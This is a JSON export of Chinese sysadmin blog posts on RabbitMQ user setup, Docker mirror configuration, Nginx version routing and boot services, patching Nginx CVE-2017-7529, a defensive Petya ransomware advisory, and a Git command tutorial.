status 4.3 开启web管理接口RabbitMQ默认情况下近允许通过命令行来管理，在日常工作中多有不便，还好RabbitMQ自带了web管理界面，只需要启动插件便可以使用。1# rabbitmq-plugins enable rabbitmq_management 使用浏览器访问 http://[IP]:15672 输入用户名和密码就可以访问web管理界面了。 4.4 配置RabbitMQ用户默认情况下，RabbitMQ的默认的guest用户只允许本机访问，如果需要远程访问，可以新增一个用户并配置远程；同时，由于RabbitMQ默认的账号用户名和密码都是guest。为了安全起见, 先删掉默认用户。 新增远程管理用户rabbitmq123# rabbitmqctl add_user rabbitmq password# rabbitmqctl set_permissions -p \"/\" rabbitmq \".*\" \".*\" \".*\"# rabbitmqctl set_user_tags rabbitmq administrator 删除默认用户guest12# rabbitmqctl delete_user guestDeleting user \"guest\" ... 4.5 RabbitMQ常用命令12345678910111213141516171819查看当前所有用户# rabbitmqctl list_usersListing users ...rabbitmq [administrator]查看默认guest用户的权限# rabbitmqctl list_user_permissions guest添加新用户# rabbitmqctl add_user username password设置用户tag# rabbitmqctl set_user_tags username administrator赋予用户默认vhost的全部操作权限# rabbitmqctl set_permissions -p / username \".*\" \".*\" \".*\"查看用户的权限# rabbitmqctl list_user_permissions username 4.6 RabbitMQ用户角色RabbitMQ的用户角色分类： none、management、policymaker、monitoring、administrator RabbitMQ各类角色描述： none不能访问 management plugin management用户可以通过AMQP做的任何事外加：列出自己可以通过AMQP登入的virtual hosts查看自己的virtual hosts中的queues, exchanges 和 bindings查看和关闭自己的channels 和 connections查看有关自己的virtual hosts的“全局”的统计信息，包含其他用户在这些virtual hosts中的活动。 policymakermanagement可以做的任何事外加：查看、创建和删除自己的virtual hosts所属的policies和parameters monitoringmanagement可以做的任何事外加：列出所有virtual hosts，包括他们不能登录的virtual hosts查看其他用户的connections和channels查看节点级别的数据如clustering和memory使用情况查看真正的关于所有virtual hosts的全局的统计信息 administratorpolicymaker和monitoring可以做的任何事外加:创建和删除virtual hosts查看、创建和删除users查看创建和删除permissions关闭其他用户的connections 5. 一些踩到的坑5.1 关于编译环境编译安装Erlang的时候会出现报错： jinterface : No Java compiler found 可以通过安装jdk来解决，如果有gcc环境，无需安装jdk，可以在configure时增加 –disable-javac来跳过警告。 5.2 重启服务器后，RabbitMQ用户丢失问题在部署配置完成后，重启了一次服务器，服务器启动后重新启动RabbitMQ服务，结果神奇的发现RabbitMQ用户丢失了。原因如下：123RabbitMQ数据是根据当前hostname作为node节点作为数据名保存# ls /data/program/rabbitmq/var/lib/rabbitmq/mnesia/rabbit@Centos7-01 rabbit@Centos7-01.pid rabbit@Centos7-01-plugins-expand 重启服务器之前我修改了hostname，所以重启之后，RabbitMQ服务使用新的hostname来保存数据。 可以通过添加RabbitMQ固定节点名字，保证数据文件不变。1# echo 'NODENAME=rabbit@info' | tee -a etc/rabbitmq/rabbitmq-env.conf","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"Centos","slug":"Linux/Centos","permalink":"http://blog.unixmen.cn/categories/Linux/Centos/"},{"name":"RabbitMQ","slug":"Linux/Centos/RabbitMQ","permalink":"http://blog.unixmen.cn/categories/Linux/Centos/RabbitMQ/"}],"tags":[{"name":"Centos","slug":"Centos","permalink":"http://blog.unixmen.cn/tags/Centos/"},{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"http://blog.unixmen.cn/tags/RabbitMQ/"}]},{"title":"配置Docker使用国内镜像源及镜像加速器","slug":"配置docker使用国内镜像源及镜像加速器","date":"2018-04-25T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2018/04/26/配置docker使用国内镜像源及镜像加速器/","link":"","permalink":"http://blog.unixmen.cn/2018/04/26/配置docker使用国内镜像源及镜像加速器/","excerpt":"因为众所周知的原因，在国内访问docker官方yum源经常会出现不可知状态，为了正常使用docker，我们需要将docker yum源修改为国内yum源来解决访问慢或者无法访问的问题。目前国内大多数开放镜像站都提供了docker yum源，如：阿里云、USTC等，此处以阿里云为例。\n1. 修改docker-ce.repo文件，配置国内镜像站地址docker-ce.repo文件可从阿里云或USTC镜像站下载，阿里云下载地址：https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\n\n不知为何，阿里云与USTC镜像站上默认的docker-ce.repo文件内部地址均是指向docker官方站https://download-stage.docker.com 这样导致直接下载下来的repo文件无法正常使用，需要将baseurl修改为国内镜像站的地址。123# vim /etc/yum.repos.d/docker-ce.repo# sed -i 's@https://download-stage.docker.com/linux/centos/7/@https://mirrors.aliyun.com/docker-ce/linux/centos/7/@g' /etc/yum.repos.d/docker-ce.repo# sed -i 's@https://download-stage.docker.com/linux/centos/gpg@https://mirrors.aliyun.com/docker-ce/linux/centos/gpg@g' /etc/yum.repos.d/docker-ce.repo\n\n修改完成后，yum安装docker就可以直接使用国内yum源了。","text":"因为众所周知的原因，在国内访问docker官方yum源经常会出现不可知状态，为了正常使用docker，我们需要将docker yum源修改为国内yum源来解决访问慢或者无法访问的问题。目前国内大多数开放镜像站都提供了docker yum源，如：阿里云、USTC等，此处以阿里云为例。 1. 修改docker-ce.repo文件，配置国内镜像站地址docker-ce.repo文件可从阿里云或USTC镜像站下载，阿里云下载地址：https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 不知为何，阿里云与USTC镜像站上默认的docker-ce.repo文件内部地址均是指向docker官方站https://download-stage.docker.com 这样导致直接下载下来的repo文件无法正常使用，需要将baseurl修改为国内镜像站的地址。123# vim /etc/yum.repos.d/docker-ce.repo# sed -i 's@https://download-stage.docker.com/linux/centos/7/@https://mirrors.aliyun.com/docker-ce/linux/centos/7/@g' /etc/yum.repos.d/docker-ce.repo# sed -i 's@https://download-stage.docker.com/linux/centos/gpg@https://mirrors.aliyun.com/docker-ce/linux/centos/gpg@g' /etc/yum.repos.d/docker-ce.repo 修改完成后，yum安装docker就可以直接使用国内yum源了。 2. 修改/etc/docker/daemon.json文件，配置docker镜像加速器配置完docker的国内yum源仅仅解决了yum安装docker时的访问问题，但在docker实际使用中还面临另外一个问题；docker默认镜像仓库Docker Hub服务器位于国外，因此在国内访问的时候依然会出现各种故障，为此docker提供了一个镜像加速器的设置，可以通过配置位于国内的镜像加速器来加速docker镜像的拉取。Docker 官方和国内很多云服务商都提供了国内加速器服务，例如： Docker 官方提供的中国 registry mirror阿里云加速器DaoCloud 加速器后两者需要注册相关账号才可以使用。 修改/etc/docker/daemon.json文件，添加以下内容，如此文件不存在则创建之；123456# vim /etc/docker/daemon.json&#123;\"registry-mirrors\": [\"https://registry.docker-cn.com\"]&#125; 修改完成后，需重启服务生效；12# systemctl daemon-reload# systemctl restart docker 到此为止，可以愉快的使用docker了。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"Docker","slug":"Linux/Docker","permalink":"http://blog.unixmen.cn/categories/Linux/Docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"镜像源","slug":"镜像源","permalink":"http://blog.unixmen.cn/tags/镜像源/"}]},{"title":"使用Nginx来配置服务端兼容APP接口多版本","slug":"Nginx+APP接口多版本兼容","date":"2018-03-19T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2018/03/20/Nginx+APP接口多版本兼容/","link":"","permalink":"http://blog.unixmen.cn/2018/03/20/Nginx+APP接口多版本兼容/","excerpt":"\n移动互联网时代，讲究的是快速迭代，为了完善产品功能，一款APP需要不断的更新版本发布功能；而为了不影响用户体验，很多时候我们无法做到每个版本都强制用户更新；这样一来势必要保证APP多版本共存，作为APP与服务端交互的交互的api接口也将存在多个接口共存的情况，所以，我们必须考虑到如何实现APP接口多版本共存。\n\n1. APP接口多版本共存的几种实现方式1.1 URL请求中加入版本信息\n例如：www.xxx.com/api.xxx?version=v1www.xxx.com/api.xxx?version=v2\n\n1.2 使用不同子域名来区分不同版本的api接口\n例如：api1.xxx.comapi2.xxx.com\n\n1.3 URL中加入不同版本路径来区分不同版本的api接口\n例如：www.xxx.com/v1/apiwww.xxx.com/v2/api\n\n1.4 在URL提交header中加入版本信息\n例如：header信息中直接添加一个字段：http_AppVersion = 1\n","text":"移动互联网时代，讲究的是快速迭代，为了完善产品功能，一款APP需要不断的更新版本发布功能；而为了不影响用户体验，很多时候我们无法做到每个版本都强制用户更新；这样一来势必要保证APP多版本共存，作为APP与服务端交互的交互的api接口也将存在多个接口共存的情况，所以，我们必须考虑到如何实现APP接口多版本共存。 1. APP接口多版本共存的几种实现方式1.1 URL请求中加入版本信息 例如：www.xxx.com/api.xxx?version=v1www.xxx.com/api.xxx?version=v2 1.2 使用不同子域名来区分不同版本的api接口 例如：api1.xxx.comapi2.xxx.com 1.3 URL中加入不同版本路径来区分不同版本的api接口 例如：www.xxx.com/v1/apiwww.xxx.com/v2/api 1.4 在URL提交header中加入版本信息 例如：header信息中直接添加一个字段：http_AppVersion = 1 2. 我们选择的方案在我们的技术选型过程中，不远将版本信息暴露在URL中，因此我们选择将版本信息放在header中，通过服务端来判断app版本信息并将请求分发到不同的接口服务上。因此，我们选择在接口服务前面加一个Nginx来反代请求并分发，而Nginx原生支持用户自定义header，所以我们只需要在提交的header信息中定义一个http_AppVersion字段，APP端请求到Nginx服务器，Nginx服务器根据请求过来的header信息中的http_AppVersion字段值将不同版本的APP请求转发的不同的api接口服务上。 3. Nginx的具体配置12345678910111213141516171819202122location / &#123;if ($http_AppVersion = \"1_0_1\") &#123;proxy_pass https://api1.xxx.com/1_0_1$request_uri;break;&#125;if ($http_AppVersion = \"1.0.2\") &#123;proxy_pass https://api1.xxx.com/1_0_2$request_uri;break;&#125;if ($http_AppVersion = \"1.0.3\") &#123;proxy_pass https://api1.xxx.com/1_0_3$request_uri;break;&#125;if ($http_AppVersion = \"1.0.4\") &#123;proxy_pass https://api1.xxx.com/1_0_4$request_uri;break;&#125;if ($http_AppVersion = \"\") &#123;proxy_pass https://api1.xxx.com/1_0_1$request_uri;break;&#125;&#125;","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"Nginx/OpenResty","slug":"Linux/Nginx-OpenResty","permalink":"http://blog.unixmen.cn/categories/Linux/Nginx-OpenResty/"}],"tags":[{"name":"openResty","slug":"openResty","permalink":"http://blog.unixmen.cn/tags/openResty/"},{"name":"app","slug":"app","permalink":"http://blog.unixmen.cn/tags/app/"},{"name":"多版本","slug":"多版本","permalink":"http://blog.unixmen.cn/tags/多版本/"}]},{"title":"如何添加Nginx开机启动","slug":"如何添加nginx开机启动","date":"2017-07-13T01:55:14.000Z","updated":"2017-07-13T07:44:57.825Z","comments":true,"path":"2017/07/13/如何添加nginx开机启动/","link":"","permalink":"http://blog.unixmen.cn/2017/07/13/如何添加nginx开机启动/","excerpt":"","text":"一、简述：Nginx在编译安装完成后不会注册为系统服务，所以需要手工添加系统服务。本文介绍在CentOS 6和CentOS 7 下添加nginx系统开机启动服务的方法。 二、Centos7 添加nginx开机启动建立服务管理文件： 新建/usr/lib/systemd/system/nginx.service文件，并添加以下内容：12345678910111213141516171819202122#nginx服务配置到该文件中#服务描述性的配置[Unit]Description=nginxDocumentation=http://nginx.org/en/docs/After=network.target remote-fs.target nss-lookup.target#服务关键配置[Service]Type=forking#pid文件位置一定要与nginx实际配置文件中的pid配置路径一致，这个很重要，否则会服务启动失败PIDFile=/usr/local/nginx/logs/nginx.pid#启动前检测 nginx配置文件是否存在问题ExecStartPre=/usr/local/nginx/sbin/nginx -t -c /usr/local/nginx/conf/nginx.conf#启动ExecStart=/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf#重启ExecReload=/bin/kill -s HUP $MAINPID#关闭ExecStop=/bin/kill -s QUIT $MAINPIDPrivateTmp=true[Install]WantedBy=multi-user.target 使用systemd进行管理服务 启动nginx服务 1systemctl start nginx.service 查看nginx服务状态 1systemctl status nginx.service 设置nginx.service开机启动 1systemctl enable nginx.service 测试重新加载 1systemctl reload nginx.service 三、CentOS 6 添加nginx开机启动:建立服务管理文件： 新建 /etc/init.d/nginx 并添加以下内容： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#!/bin/bash# nginx Startup script for the Nginx HTTP Server# it is v.1.2.1 version.# chkconfig: - 85 15# description: Nginx is a high-performance web and proxy server.# It has a lot of features, but it&apos;s not for everyone.# processname: nginx# pidfile: /var/run/nginx.pid# config: /usr/local/nginx/conf/nginx.conf# nginxd、nginx_config、nginx_pid一定要根据自己的实际配置保持一致，这个很重要，否则会服务启动失败nginxd=/usr/local/nginx/sbin/nginxnginx_config=/usr/local/nginx/conf/nginx.confnginx_pid=/var/run/nginx.pidRETVAL=0prog=&quot;nginx&quot;# Source function library.. /etc/rc.d/init.d/functions# Source networking configuration.. /etc/sysconfig/network# Check that networking is up.[ $&#123;NETWORKING&#125; = &quot;no&quot; ] &amp;&amp; exit 0[ -x $nginxd ] || exit 0# Start nginx daemons functions.start() &#123;if [ -e $nginx_pid ];then echo &quot;nginx already running....&quot; exit 1fi echo -n $&quot;Starting $prog: &quot; daemon $nginxd -c $&#123;nginx_config&#125; RETVAL=$? echo [ $RETVAL = 0 ] &amp;&amp; touch /var/lock/subsys/nginx return $RETVAL&#125;# Stop nginx daemons functions.stop() &#123; echo -n $&quot;Stopping $prog: &quot; killproc $nginxd RETVAL=$? echo [ $RETVAL = 0 ] &amp;&amp; rm -f /var/lock/subsys/nginx /var/run/nginx.pid&#125;# reload nginx service functions.reload() &#123; echo -n $&quot;Reloading $prog: &quot; #kill -HUP `cat $&#123;nginx_pid&#125;` killproc $nginxd -HUP RETVAL=$? echo&#125;# See how we were called.case &quot;$1&quot; instart) start ;;stop) stop ;;reload) reload ;;restart) stop start ;;status) status $prog RETVAL=$? ;;*) echo $&quot;Usage: $prog &#123;start|stop|restart|reload|status|help&#125;&quot; exit 1esacexit $RETVAL 添加执行权限 1chmod 755 /etc/init.d/nginx CentOS6 下的nginx服务管理 添加nginx服务 1chkconfig --add nginx 设置nginx开机启动 1chkconfig nginx 35 on 查看添加的服务 1chkconfig --list |grep nginx 启动nginx服务 1service nginx start 查看nginx服务状态 1service nginx status","raw":null,"content":null,"categories":[{"name":"nginx","slug":"nginx","permalink":"http://blog.unixmen.cn/categories/nginx/"},{"name":"技术文档","slug":"nginx/技术文档","permalink":"http://blog.unixmen.cn/categories/nginx/技术文档/"},{"name":"工具","slug":"nginx/技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/nginx/技术文档/Tools/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"http://blog.unixmen.cn/tags/nginx/"}]},{"title":"修复nginx漏洞（CVE-2017-7529）","slug":"修复nginx漏洞（CVE-2017-7529）","date":"2017-07-12T10:05:02.000Z","updated":"2017-07-13T03:03:57.040Z","comments":true,"path":"2017/07/12/修复nginx漏洞（CVE-2017-7529）/","link":"","permalink":"http://blog.unixmen.cn/2017/07/12/修复nginx漏洞（CVE-2017-7529）/","excerpt":"","text":"漏洞介绍：2017-07-12 nginx 发布高危漏洞通报，并提供了修复方法及数据包。 漏洞信息：漏洞编号：CVE-2017-7529漏洞名称：Nginx敏感信息泄露官方评级：高危漏洞描述：当使用nginx标准模块时，允许攻击者如果从缓存返回响应，则获取缓存文件头，在某些配置中，缓存文件头可能包含IP地址的后端服务器或其他敏感信息，从而导致信息泄露。漏洞利用条件和方式：远程利用漏洞影响范围：Nginx 0.5.6 - 1.13.2修复建议：升级到Nginx 1.13.3, 1.12.1。漏洞详情查看：http://mailman.nginx.org/pipermail/nginx-announce/2017/000200.html 漏洞修复方法：Centos7: 查看当前版本： 1nginx -V 下载漏洞修复软件包： 1wget -Sc http://nginx.org/download/nginx-1.12.1.tar.gz 解压程序源码包 1tar -zxf nginx-1.12.1.tar.gz 进入解压后的文件目录： 1cd nginx-1.12.1 使用原有参数(nginx -V查看)进行配置： 1./configure --prefix=/opt/webserver/nginx --without-http_memcached_module --user=nginx --group=nginx --with-http_image_filter_module --with-http_stub_status_module --with-http_ssl_module --with-http_gzip_static_module --with-openssl=/usr/local/src/openssl-1.0.2l --with-zlib=/usr/local/src/zlib-1.2.11/ --with-pcre --with-http_sub_module --add-module=/usr/local/src/nginx-accesskey --add-module=/usr/local/src/ngx_http_geoip2_module --with-http_realip_module --with-http_mp4_module 然后编译，但不要make install，切记 1make 编译完成后可以在objs目录下看到有个名为nginx执行文件 123ls objs/nginx[root@fqptuo nginx-1.12.1]# ls -l objs/nginx-rwxr-xr-x 1 root root 9031768 Jul 12 13:57 objs/nginx 备份原有的nginx 1mv /opt/webserver/nginx/sbin/nginx&#123;,.1.12.0&#125; 复制编译后的nginx文件到原有目录 1cp objs/nginx /opt/webserver/nginx/sbin/nginx 查看升级后的版本 1nginx -v 检查升级后的nginx版本与当前配置是否测试通过 1nginx -t 优雅的平滑升级nginx 1make upgrade 正常情况下会有类似以下的输出：1234567/opt/webserver/nginx/sbin/nginx -tnginx: the configuration file /opt/webserver/nginx/conf/nginx.conf syntax is oknginx: configuration file /opt/webserver/nginx/conf/nginx.conf test is successfulkill -USR2 `cat /opt/webserver/nginx/logs/nginx.pid`sleep 1test -f /opt/webserver/nginx/logs/nginx.pid.oldbinkill -QUIT `cat /opt/webserver/nginx/logs/nginx.pid.oldbin` 查看当前nginx服务状态 1systemctl status nginx 至此，nginx服务升级完成。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"},{"name":"nginx","slug":"技术文档/漏洞/安全/nginx","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/nginx/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"http://blog.unixmen.cn/tags/nginx/"}]},{"title":"勒索病毒袭Petya预警","slug":"勒索病毒袭Petya预警","date":"2017-06-29T02:50:41.000Z","updated":"2017-06-29T03:06:38.712Z","comments":true,"path":"2017/06/29/勒索病毒袭Petya预警/","link":"","permalink":"http://blog.unixmen.cn/2017/06/29/勒索病毒袭Petya预警/","excerpt":"","text":"近日，代号为Petya的新一轮勒索病毒袭击了俄罗斯、英国、乌克兰等多个国家，机场、银行及大型企业被报告感染病毒，目前中国国内也已有用户中招。据报道，本轮病毒比之前的WannaCry勒索病毒更专业、更难对付。 病毒加密硬盘，勒索比特币新勒索病毒Petya不仅对文件进行加密，而且直接将整个硬盘加密、锁死，在出现以下界面并瘫痪后，其会自动向局域网内部的其它服务器及终端进行传播。Petya勒索病毒感染的电脑： 同时，用户的电脑开机后则会黑屏，并显示勒索信。信中称，用户想要解锁，需要向黑客的账户转折合300美元的比特币。 勒索信息： 与之前病毒相比，威胁升级这种攻击手法十分类似于曾在上个月肆虐全球的勒索病毒，不过看起来比当时的勒索病毒更加专业、也更难以对付。 1.Petya勒索病毒变种的传播速度更快。在欧洲国家重灾区，新病毒变种的传播速度达到每10分钟感染5000余台电脑，多家运营商、石油公司、零售商、机场、ATM机等企业和公共设施已大量沦陷，甚至乌克兰副总理的电脑也遭到感染。 2.感染并加密本地文件的病毒进行了更新，杀毒软件除非升级至最新版病毒库，否则无法查杀及阻止其加密本机文件系统； 3.Petya综合利用了“5.12WannaCry”及“6.23勒索病毒新变种”所利用的所有Windows系统漏洞，包括MS17-010（5.12WannaCry永恒之蓝勒索病毒）及CVE-2017-8543/CVE-2017-8464（6.23勒索病毒新变种）等补丁对应的多个系统漏洞进行传播。 4.Petya直接将整个硬盘加密和锁死，用户重启后直接进入勒索界面，若不支付比特币将无法进入系统。 防止感染，立刻这样设置电脑 不要轻易点击不明附件，尤其是rtf、doc等格式文件。 内网中存在使用相同账号、密码情况的机器请尽快修改密码，未开机的电脑请确认口令修改完毕、补丁安装完成后再进行开机操作。 更新操作系统补丁（MS）https://technet.microsoft.com/en-us/library/security/ms17-010.aspx 更新 Microsoft Office/WordPad 远程执行代码漏洞（CVE -2017-0199）补丁 https://technet.microsoft.com/zh-cn/office/mt465751.aspx 禁用 WMI服务https://zhidao.baidu.com/question/91063891.htmlWMI（Windows Management Instrumentation Windows 管理规范）是一项核心的Windows管理技术，你可以通过如下方法停止： I. 在服务页面开启WMI服务。在开始-运行，输入services.msc，进入服务。或者，在控制面板，查看方式选择大图标，选择管理工具，在管理工具中双击服务。II.在服务页面，按W，找到WMI服务，找到后，双击 ，直接点击停止服务即可，如下图所示： 6.更新杀毒软件目前，市面上主流的杀毒软件与电脑保护软件均有插件或程序，可以绝大程度上保护电脑不受新型勒索病毒感染。用户只需在软件内搜索Petya，或到其官网搜索修复工具即可。 7.提高用户安全意识 I. 限制管理员权限Petya勒索病毒的运行需要管理员权限，企业网管可以通过严格审查限制管理员权限的方式减少攻击面，个人用户可以考虑使用非管理员权限的普通账号登陆进行日常操作。II. 关闭系统崩溃重启Petya勒索病毒的“发病”需要系统重启，因此想办法避免系统重启也能有效防御Petya并争取漏洞修补或者文件抢救时间。只要系统不重新启动引导，病毒就没有机会加密MFT主文件分区表，用户就有机会备份磁盘中的文件（微软官方教程）。III. 备份重要数据重要文件进行本地磁盘冷存储备份，以及云存储备份。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"勒索病毒","slug":"技术文档/勒索病毒","permalink":"http://blog.unixmen.cn/categories/技术文档/勒索病毒/"},{"name":"安全","slug":"技术文档/勒索病毒/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/勒索病毒/安全/"}],"tags":[{"name":"勒索病毒","slug":"勒索病毒","permalink":"http://blog.unixmen.cn/tags/勒索病毒/"},{"name":"petya","slug":"petya","permalink":"http://blog.unixmen.cn/tags/petya/"}]},{"title":"Git 入门及实践","slug":"Git-入门及实践","date":"2017-05-18T08:35:00.000Z","updated":"2017-06-08T08:55:03.649Z","comments":true,"path":"2017/05/18/Git-入门及实践/","link":"","permalink":"http://blog.unixmen.cn/2017/05/18/Git-入门及实践/","excerpt":"","text":"一、文章说明本文详细介绍git的基础操作及命令详解，并通过两个经典案例进行实践练习。 二、Git介绍：GIT （分布式版本控制系统）是 Linus Torvalds为了帮助管理Linux内核开发而开发的一款免费、开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目，可以有效、高速的处理从很小到非常大的项目版本管理。 1、Git的功能特性： 从服务器上克隆完整的Git仓库（包括代码和版本信息）到单机上。 在自己的机器上根据不同的开发目的，创建分支，修改代码。 在单机上自己创建的分支上提交代码。 在单机上合并分支。 把服务器上最新版的代码fetch下来，然后跟自己的主分支合并。 生成补丁（patch），把补丁发送给主开发者。 看主开发者的反馈，如果主开发者发现两个一般开发者之间有冲突（他们之间可以合作解决的冲突），就会要求他们先解决冲突，然后再由其中一个人提交。如果主开发者可以自己解决，或者没有冲突，就通过。 2、Git工作流程介绍： Workspace：工作区 Index / Stage：暂存区 Repository：仓库区（或本地仓库） Remote：远程仓库 3、Git的优点： 适合分布式开发，强调个体。 公共服务器压力和数据量都不会太大。 速度快、灵活。 任意两个开发者之间可以很容易的解决冲突。 离线工作。 4、Git的缺点： 资料少（起码中文资料很少）。 学习周期相对而言比较长。 不符合常规思维。 代码保密性差，一旦开发者把整个库克隆下来就可以完全公开所有代码和版本信息。 三、Git安装git 是一跨平台的分布式版本控制系统，我们如何开始呢？下面介绍在多平台下的安装方法。 1、Linux 平台 基于Redhat的衍生分支 1yum install git-all 基于Debian的衍生分支 1apt-get install git-all 2、Mac系统安装Mac系统下有几种安装方式: 最简单的方式是Xcode Command Line Tools，在OSX10.9或更高的系统版本，你只需要在终端运行一下git命令，如果没有安装git，系统将自动为你安装。 如果你想安装更新的版本，可以在Git官方网站下载由官方维护的 OSX Git 安装程序，网址为 http://git-scm.com/download/mac 在Mac系统下也可以安装图形化Git工具，你可以在git官方网站上下载安装程序，网址为：https://central.github.com/deployments/desktop/desktop/latest/darwin，下载git-osx-installer到本机后进行手动安装。 3、Windows 安装git在 Windows 上安装 Git 也有几种安装方法。官方版本可以在 Git 官方网站下载。 打开http://git-scm.com/download/win，下载会自动开始。如果你想安装更新的版本，可以在Git官方网站下载由官方维护的 windows Git 安装程序可以访问https://central.github.com/deployments/desktop/desktop/latest/win32?format=msi进行下载，然后安装。 四、Git基础操作命令介绍本节详细介绍了git常用命令及基础操作方法 1、新建代码库 在当前目录新建一个Git代码库 1git init 新建一个目录，将其初始化为Git代码库 1git init [project-name] 下载一个项目和它的整个代码历史 1git clone [url] 2、配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 显示当前的Git配置 1git config --list 编辑Git配置文件 1git config -e [--global] 设置提交代码时的用户信息 12git config [--global] user.name &quot;[name]&quot;git config [--global] user.email &quot;[email address]&quot; 3、增加/删除文件 添加指定文件到暂存区 1git add [file1] [file2] ... 添加指定目录到暂存区，包括子目录 1git add [dir] 添加当前目录的所有文件到暂存区 1git add . 添加每个变化前，都会要求确认,对于同一个文件的多处变化，可以实现分次提交 1git add -p 删除工作区文件，并且将这次删除放入暂存区 1git rm [file1] [file2] ... 停止追踪指定文件，但该文件会保留在工作区 1git rm --cached [file] 改名文件，并且将这个改名放入暂存区 1git mv [file-original] [file-renamed] 4、代码提交 提交暂存区到仓库区 1git commit -m [message] 提交暂存区的指定文件到仓库区 1git commit [file1] [file2] ... -m [message] 提交工作区自上次commit之后的变化，直接到仓库区 1git commit -a 提交时显示所有diff信息 1git commit -v 使用一次新的commit，替代上一次提交, 如果代码没有任何新变化，则用来改写上一次commit的提交信息 1git commit --amend -m [message] 重做上一次commit，并包括指定文件的新变化 1git commit --amend [file1] [file2] ... 5、分支 列出所有本地分支 1git branch 列出所有远程分支 1git branch -r 列出所有本地分支和远程分支 1git branch -a 新建一个分支，但依然停留在当前分支 1git branch [branch-name] 新建一个分支，并切换到该分支 1git checkout -b [branch] 新建一个分支，指向指定commit 1git branch [branch] [commit] 新建一个分支，与指定的远程分支建立追踪关系 1git branch --track [branch] [remote-branch] 切换到指定分支，并更新工作区 1git checkout [branch-name] 切换到上一个分支 1git checkout - 建立追踪关系，在现有分支与指定的远程分支之间 1git branch --set-upstream [branch] [remote-branch] 合并指定分支到当前分支 1git merge [branch] 选择一个commit，合并进当前分支 1git cherry-pick [commit] 删除分支 1git branch -d [branch-name] 删除远程分支 12git push origin --delete [branch-name]git branch -dr [remote/branch] 6、标签 列出所有tag 1git tag 新建一个tag在当前commit 1git tag [tag] 新建一个tag在指定commit 1git tag [tag] [commit] 删除本地tag 1git tag -d [tag] 删除远程tag 1git push origin :refs/tags/[tagName] 查看tag信息 1git show [tag] 提交指定tag 1git push [remote] [tag] 提交所有tag 1git push [remote] --tags 新建一个分支，指向某个tag 1git checkout -b [branch] [tag] 7、查看信息 显示有变更的文件 1git status 显示当前分支的版本历史 1git log 显示commit历史，以及每次commit发生变更的文件 1git log --stat 搜索提交历史，根据关键词 1git log -S [keyword] 显示某个commit之后的所有变动，每个commit占据一行 1git log [tag] HEAD --pretty=format:%s 显示某个commit之后的所有变动，其”提交说明”必须符合搜索条件 1git log [tag] HEAD --grep feature 显示某个文件的版本历史，包括文件改名 12git log --follow [file]git whatchanged [file] 显示指定文件相关的每一次diff 1git log -p [file] 显示过去5次提交 1git log -5 --pretty --oneline 显示所有提交过的用户，按提交次数排序 1git shortlog -sn 显示指定文件是什么人在什么时间修改过 1git blame [file] 显示暂存区和工作区的差异 1git diff 显示暂存区和上一个commit的差异 1git diff --cached [file] 显示工作区与当前分支最新commit之间的差异 1git diff HEAD 显示两次提交之间的差异 1git diff [first-branch]...[second-branch] 显示今天你写了多少行代码 1git diff --shortstat &quot;@&#123;0 day ago&#125;&quot; 显示某次提交的元数据和内容变化 1git show [commit] 显示某次提交发生变化的文件 1git show --name-only [commit] 显示某次提交时，某个文件的内容 1git show [commit]:[filename] 显示当前分支的最近几次提交 1git reflog 8、远程同步 下载远程仓库的所有变动 1git fetch [remote] 显示所有远程仓库 1git remote -v 显示某个远程仓库的信息 1git remote show [remote] 增加一个新的远程仓库，并命名 1git remote add [shortname] [url] 取回远程仓库的变化，并与本地分支合并 1git pull [remote] [branch] 上传本地指定分支到远程仓库 1git push [remote] [branch] 强行推送当前分支到远程仓库，即使有冲突 1git push [remote] --force 推送所有分支到远程仓库 1git push [remote] --all 9、撤销 恢复暂存区的指定文件到工作区 1git checkout [file] 恢复某个commit的指定文件到暂存区和工作区 1git checkout [commit] [file] 恢复暂存区的所有文件到工作区 1git checkout . 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变 1git reset [file] 重置暂存区与工作区，与上一次commit保持一致 1git reset --hard 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变 1git reset [commit] 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致 1git reset --hard [commit] 重置当前HEAD为指定commit，但保持暂存区和工作区不变 1git reset --keep [commit] 新建一个commit，用来撤销指定commit 后者的所有变化都将被前者抵消，并且应用到当前分支 1git revert [commit] 暂时将未提交的变化移除，稍后再移入 12git stashgit stash pop 10、其他 生成一个可供发布的压缩包1git archive 五、实例实践分享学习git的最好方式就是动手操作，在介绍完git基础操作后，通过两个典型实例进行进行实践，用以巩固学习git的基础操作。你可以在https://github.com上进行练习，也可以在我搭建的gitlab测试环境http://git.unixmen.cn/进行练习实践。下面是案例介绍，Enjoy it! 